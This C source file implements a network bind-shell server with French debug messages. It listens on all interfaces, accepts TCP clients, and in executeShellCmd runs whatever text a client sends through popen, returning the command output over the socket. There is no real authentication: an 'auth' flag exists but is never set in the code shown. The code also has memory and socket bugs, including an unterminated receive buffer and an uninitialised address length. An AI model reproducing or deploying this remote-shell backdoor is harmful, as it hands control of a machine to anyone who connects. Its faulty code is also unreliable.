#include "./main.h"

void addConnection(s_connection *connection, int new_fd) {
    printf("Create socket: %d\n", new_fd);
    l_socket *new_socket = malloc(sizeof(l_socket));
    if (connection->list_socket == NULL) {
        connection->list_socket = new_socket;
        connection->max_fd = new_fd;
        new_socket->is_listen = 1;
    } else {
        l_socket *socket = connection->list_socket;
        while (socket->next != NULL) {
            socket = socket->next;
        }
        socket->next = new_socket;
        new_socket->is_listen = 0;
        if (new_fd > connection->max_fd)
            connection->max_fd = new_fd;
    }
    new_socket->socket_fd = new_fd;
    new_socket->auth = 0;
    new_socket->next = NULL;
}

s_connection *initConnection() {
    s_connection *connection = (s_connection *) malloc(sizeof(s_connection));

    addConnection(connection, socket(AF_INET, SOCK_STREAM, 0));
    if (connection->list_socket->socket_fd < 0) {
        perror("ERROR opening socket");
        exit(1);
    }

    memset((char *) &connection->serv_addr, 0, sizeof(connection->serv_addr));
    connection->serv_addr.sin_family = AF_INET;
    connection->serv_addr.sin_port = htons(PORT);
    connection->serv_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(connection->list_socket->socket_fd, (struct sockaddr *) &connection->serv_addr,
             sizeof(connection->serv_addr)) < 0) {
        perror("ERROR on binding");
        exit(1);
    }
    return connection;
}

int executeShellCmd(l_socket *socket) {
    char socket_buffer[512];
    char response_buffer[512];
    int error = recv(socket->socket_fd, socket_buffer, 512, 0);
    printf("execute cmd for socket: %d\n", socket->socket_fd);
    if (error == 0) {
        return 0;
    }
    if (error < 0) {
        perror("ERROR receiving from socket");
    //    exit(1);
    }
    FILE *shell = popen(socket_buffer, "r");
    if (shell == NULL) {
        printf("Erreur lors de l'exécution de la commande\n");
  //      exit(1);
    }
    while (fgets(response_buffer, 512, shell) != NULL) {
        send(socket->socket_fd, response_buffer, strlen(response_buffer), 0);
    }
    pclose(shell);
    return 1;
}

void connectNewShell(s_connection *connection, l_socket *socket) {
    struct sockaddr_in client_addr;
    socklen_t client_addr_len;
    printf("socket d'acceptation %d\n", socket->socket_fd);
    int fd = accept(socket->socket_fd, (struct sockaddr *) &client_addr, &client_addr_len);
    if (fd < 0) {
        perror("ERROR on accept");
        exit(1);
    } else {
        addConnection(connection, fd);
    }
}

void removeSocket(s_connection *connection, l_socket *socket) {
    printf("suppression du socket: %d\n", socket->socket_fd);
    l_socket *previous = connection->list_socket;
    l_socket *s = connection->list_socket->next;
    while (s != NULL) {
        if (s == socket) {
            previous->next = socket->next;
            free(s);
            break;
        }
        previous = s;
        s = s->next;
    }
}

int main(int argc, char **argv, char **env) {
    s_connection *connection = initConnection();
    fd_set read_fds;

    while (1) {
        FD_ZERO(&read_fds);
        l_socket *s = connection->list_socket;
        while (s != NULL) {
            printf("Check de la vie du socket:: %d\n", s->socket_fd);
            int optval;
            socklen_t optlen = sizeof(optval);
            getsockopt(s->socket_fd, SOL_SOCKET, SO_ERROR, &optval, &optlen);
            if (optval == -1) {
                printf("Le socket doit etre fermé\n");
                removeSocket(connection, s);
            } else
                printf("Le socket ne doit pas etre fermé\n");
            FD_SET(s->socket_fd, &read_fds);
            s = s->next;
        }
        listen(connection->list_socket->socket_fd, 3);
        int retval = select(connection->max_fd + 1, &read_fds, NULL, NULL, NULL);
        if (retval == -1) {
            printf("Erreur pendant le select");
        } else if (retval > 0) {
            l_socket *socket_loop = connection->list_socket;
            while (socket_loop != NULL) {
                if (FD_ISSET(socket_loop->socket_fd, &read_fds)) {
                    printf("Data sur le socket\n");
                    if (socket_loop->is_listen) {
                        connectNewShell(connection, socket_loop);
                        break;
                    } else {
                        if (socket_loop->auth) {
                            if (!executeShellCmd(socket_loop)) {
                                l_socket *s = socket_loop;
                                socket_loop = socket_loop->next;
                                removeSocket(connection, s);
                                continue;
                            }
                            else {

                            }
                        }
                    }
                }
                socket_loop = socket_loop->next;
            }
        }
    }
    return 0;
}
